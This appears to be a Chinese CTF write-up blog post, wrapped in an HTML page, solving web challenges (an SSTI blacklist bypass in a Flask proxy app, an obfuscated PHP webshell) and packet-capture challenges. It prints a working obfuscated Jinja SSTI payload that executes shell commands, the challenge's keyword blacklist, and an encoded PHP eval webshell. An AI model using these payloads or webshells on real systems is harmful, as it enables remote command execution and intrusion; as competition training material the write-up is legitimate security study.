@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>	 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-12-15">2024年12月15日</time>
+        
+        
+          <span class="post__readtime">15 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/CTF/">#CTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">	</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h2><p>刚开始比赛看到题目名字里面有Proxy 就先来做这个了(在最近的比赛中见到的proxy题比较多)</p>
+<p>题目进入之后给了源码</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151757938.png" alt="image-20241215175730802"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;, methods=[&amp;quot;GET&amp;quot;])</span><br><span class="line">def source():</span><br><span class="line">    with open(__file__, &amp;#x27;r&amp;#x27;, encoding=&amp;#x27;utf-8&amp;#x27;) as f:</span><br><span class="line">        return &amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;+html.escape(f.read())+&amp;#x27;&amp;lt;/pre&amp;gt;&amp;#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;, methods=[&amp;quot;POST&amp;quot;])</span><br><span class="line">def template():</span><br><span class="line">    template_code = request.form.get(&amp;quot;code&amp;quot;)</span><br><span class="line">    # 安全过滤</span><br><span class="line">    blacklist = [&amp;#x27;__&amp;#x27;, &amp;#x27;import&amp;#x27;, &amp;#x27;os&amp;#x27;, &amp;#x27;sys&amp;#x27;, &amp;#x27;eval&amp;#x27;, &amp;#x27;subprocess&amp;#x27;, &amp;#x27;popen&amp;#x27;, &amp;#x27;system&amp;#x27;, &amp;#x27;\r&amp;#x27;, &amp;#x27;\n&amp;#x27;]</span><br><span class="line">    for black in blacklist:</span><br><span class="line">        if black in template_code:</span><br><span class="line">            return &amp;quot;Forbidden content detected!&amp;quot;</span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    print(result)</span><br><span class="line">    return &amp;#x27;ok&amp;#x27; if result is not None else &amp;#x27;error&amp;#x27;</span><br><span class="line"></span><br><span class="line">class HTTPProxyHandler:</span><br><span class="line">    def __init__(self, target_host, target_port):</span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">    def handle_request(self, client_socket):</span><br><span class="line">        try:</span><br><span class="line">            request_data = b&amp;quot;&amp;quot;</span><br><span class="line">            while True:</span><br><span class="line">                chunk = client_socket.recv(4096)</span><br><span class="line">                request_data += chunk</span><br><span class="line">                if len(chunk) &amp;lt; 4096:</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">            if not request_data:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:</span><br><span class="line">                proxy_socket.connect((self.target_host, self.target_port))</span><br><span class="line">                proxy_socket.sendall(request_data)</span><br><span class="line"></span><br><span class="line">                response_data = b&amp;quot;&amp;quot;</span><br><span class="line">                while True:</span><br><span class="line">                    chunk = proxy_socket.recv(4096)</span><br><span class="line">                    if not chunk:</span><br><span class="line">                        break</span><br><span class="line">                    response_data += chunk</span><br><span class="line"></span><br><span class="line">            header_end = response_data.rfind(b&amp;quot;\r\n\r\n&amp;quot;)</span><br><span class="line">            if header_end != -1:</span><br><span class="line">                body = response_data[header_end + 4:]</span><br><span class="line">            else:</span><br><span class="line">                body = response_data</span><br><span class="line">                </span><br><span class="line">            response_body = body</span><br><span class="line">            response = b&amp;quot;HTTP/1.1 200 OK\r\n&amp;quot; \</span><br><span class="line">                       b&amp;quot;Content-Length: &amp;quot; + str(len(response_body)).encode() + b&amp;quot;\r\n&amp;quot; \</span><br><span class="line">                       b&amp;quot;Content-Type: text/html; charset=utf-8\r\n&amp;quot; \</span><br><span class="line">                       b&amp;quot;\r\n&amp;quot; + response_body</span><br><span class="line"></span><br><span class="line">            client_socket.sendall(response)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&amp;quot;Proxy Error: &#123;e&#125;&amp;quot;)</span><br><span class="line">        finally:</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line">def start_proxy_server(host, port, target_host, target_port):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(100)</span><br><span class="line">    print(f&amp;quot;Proxy server is running on &#123;host&#125;:&#123;port&#125; and forwarding to &#123;target_host&#125;:&#123;target_port&#125;...&amp;quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            print(f&amp;quot;Connection from &#123;addr&#125;&amp;quot;)</span><br><span class="line">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span><br><span class="line">            thread.daemon = True</span><br><span class="line">            thread.start()</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print(&amp;quot;Shutting down proxy server...&amp;quot;)</span><br><span class="line">    finally:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line">def run_flask_app():</span><br><span class="line">    app.run(debug=False, host=&amp;#x27;127.0.0.1&amp;#x27;, port=5000)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;quot;__main__&amp;quot;:</span><br><span class="line">    proxy_host = &amp;quot;0.0.0.0&amp;quot;</span><br><span class="line">    proxy_port = 5001</span><br><span class="line">    target_host = &amp;quot;127.0.0.1&amp;quot;</span><br><span class="line">    target_port = 5000</span><br><span class="line"></span><br><span class="line">    # 安全反代，防止针对响应头的攻击</span><br><span class="line">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span><br><span class="line">    proxy_thread.daemon = True</span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    print(&amp;quot;Starting Flask app...&amp;quot;)</span><br><span class="line">    run_flask_app()</span><br></pre></td></tr></table></figure>
+
+<p>当时看源码的时候 看到打开源码的方式是<code>open(__file__, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f</code>就下意识的搜了一下有没有<code>merge</code>函数(怀疑可能存在原型链污染， 属于条件反射了)</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151759756.png" alt="image-20241215175919717"></p>
+<p>看到这一块感觉应该可以用ssti进行命令执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151800242.png" alt="image-20241215180046196"></p>
+<p>就在本地起了一个环境。在我的<a target="_blank" rel="noopener" href="https://yliken.github.io/2024/03/05/SSIT%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSIT模板注入</a>这篇文章中拿了一个其他比赛的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set o1=(dict(o=a,s=n))|join%&#125;&#123;%set re=(dict(re=a,ad=n))|join%&#125;&#123;%set pppct=(dict(po=a,pen=n))|join%&#125;&#123;%set%20a=(lipsum|string|list)|attr(%27pop%27)(18)%&#125;&#123;%set%20glob=(a,a,(dict(glo=a,bals=b)|join),a,a)|join%&#125;&#123;%set gt=(a,a,(dict(geti=a,tem=n)|join),a,a)|join%&#125;&#123;&#123;lipsum|attr(glob)|attr(gt)(o1)|attr(pppct)(&#x27;tac fla*&#x27;)|attr(re)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151807075.png" alt="image-20241215180725971"></p>
+<p>突然间想到在题目环境可能可以对app.py进行写入操作。就拿了这个payload直接打了一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151809998.png" alt="image-20241215180943886"></p>
+<p>当时就抱着试试看的心疼打了一下(毕竟代码还没看完就出了, 怎么可能)。结果真的能出</p>
+<p>然后靠着这样写出了。(拿了二血，<code>o((*^▽^*))o</code>)</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151811540.png" alt="image-20241215181123441"></p>
+<h2 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h2><p>这个题目比赛的时候是队友Baeke写出来的，我没看。我是赛后复现的</p>
+<p>题目环境进入之后再源码中有两个页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151819791.png" alt="image-20241215181908718"></p>
+<p>双写..&#x2F;绕过tips只是一个phpinfo();</p>
+<img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151820786.png"/>
+
+<p><code>hackme.php</code>页面是一串php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$lJbGIY=&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;;$OlWYMv=&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;;$lapUCm=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);</span><br><span class="line">$YwzIst=$lapUCm&#123;3&#125;.$lapUCm&#123;6&#125;.$lapUCm&#123;33&#125;.$lapUCm&#123;30&#125;;$OxirhK=$lapUCm&#123;33&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;.$lapUCm&#123;10&#125;.$lapUCm&#123;24&#125;;$YpAUWC=$OxirhK&#123;0&#125;.$lapUCm&#123;18&#125;.$lapUCm&#123;3&#125;.$OxirhK&#123;0&#125;.$OxirhK&#123;1&#125;.$lapUCm&#123;24&#125;;$rVkKjU=$lapUCm&#123;7&#125;.$lapUCm&#123;13&#125;;$YwzIst.=$lapUCm&#123;22&#125;.$lapUCm&#123;36&#125;.$lapUCm&#123;29&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;.$lapUCm&#123;32&#125;.$lapUCm&#123;35&#125;.$lapUCm&#123;26&#125;.$lapUCm&#123;30&#125;;eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>eval</code>改成<code>echo</code></p>
+<img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151824444.png"/>
+
+<p>得到的结果再将<code>eval</code>改为<code>echo</code>,发现是一个一句话木马</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151825705.png" alt="image-20241215182552640"></p>
+<p>蚁剑直接连</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151827790.png" alt="image-20241215182707723"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151827037.png" alt="image-20241215182737978"></p>
+<h1 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h1><h2 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h2><p>我打开数据包，找一个http数据包-&gt;追踪流 就是一顿看</p>
+<p>找到了一个数据包是执行了一条命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151832313.png" alt="image-20241215183207227"></p>
+<p>Referer字段base64解码后就是flag</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151833899.png" alt="image-20241215183338834"></p>
+<h2 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h2><p>直接拿数据包里面的<code>payload</code>梭哈</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151844816.png" alt="image-20241215184402730"></p>
+<p>在&#x2F;Database&#x2F;flag找到flag</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412151844948.png" alt="image-20241215184437895"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2026-03-26">2026·03·26</time>
+          <a class="related__link" href="/2026/03/26/CTF/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B_easy_time/">第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-11-01">2024·11·01</time>
+          <a class="related__link" href="/2024/11/01/CTF/ImaginaryCTF%202024/">ImaginaryCTF 2024</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-25">2024·10·25</time>
+          <a class="related__link" href="/2024/10/25/CTF/DownUnderCTF/">DownUnderCTF赛题复现</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/02/24/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-buster/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">hackmyvm-buster</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/11/28/Golang/Golang%20gorm/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">Go小记 Gorm模型</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
